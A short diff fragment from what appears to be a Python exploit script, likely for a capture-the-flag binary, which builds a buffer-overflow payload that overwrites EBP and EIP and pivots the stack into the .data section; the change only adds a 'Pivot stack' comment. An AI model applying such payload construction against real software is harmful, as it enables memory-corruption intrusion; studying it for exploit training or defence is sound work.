@@ -70,7 +70,7 @@ payload2 += "AAAA"
 payload  = "\x00" * (0x6c-4)
 payload += pack32(data_section) # EBP
 payload += pack32(read_80_bytes) # Overwrites EIP
-payload += pack32(leave)
+payload += pack32(leave) # Pivot stack
 payload += pack32(data_section) # .data section of binary
 payload += "AAAABBB" # The newline character of the first print payload pads this properly!
 
